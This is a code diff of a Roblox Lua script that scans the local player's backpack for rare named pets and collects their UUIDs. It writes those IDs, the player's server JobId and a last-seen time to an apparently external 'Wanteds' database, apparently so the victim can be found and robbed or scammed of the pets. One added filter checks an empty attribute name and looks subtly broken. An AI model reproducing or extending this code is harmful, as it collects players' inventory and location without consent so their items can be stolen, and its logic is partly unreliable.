@@ -15,9 +15,9 @@ local DesiredPets = {"raccoon", "dragonfly", "queen bee", "petal bee", "golden b
 local ListOfPets = {}
 local HavePets = false
 
-for _, Tool in game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
+for _, Tool in LocalPlayer.Backpack:GetChildren() do
 	for _, DesiredPetName in DesiredPets do
-		if string.find(string.lower(Tool.Name), string.lower(DesiredPetName)) then
+		if string.find(string.lower(Tool.Name), string.lower(DesiredPetName)) and Tool:GetAttribute("") ~= nil then
 			HavePets = true
 			ListOfPets[Tool.Name.."_"..math.random(100000, 999999)] = Tool:GetAttribute("PET_UUID")
 		end
@@ -135,7 +135,14 @@ if data ~= nil then
 		
 		WriteDatabase("Wanteds/"..LocalPlayer.Name, "JobId", game.JobId)
 		WriteDatabase("Wanteds/"..LocalPlayer.Name, "LastSeen", os.time())
-		WriteDatabase("Wanteds/"..LocalPlayer.Name, "Pets", ListOfPets)
+
+		coroutine.wrap(function()
+			for PetName, PetId in ListOfPets do
+				print("Adding: "..PetName)
+				WriteDatabase("Wanteds/"..LocalPlayer.Name.."/Pets", PetName, PetId)
+				print("Added "..PetName)
+			end
+		end)()
 
 		coroutine.wrap(function()
 			while wait(10) do
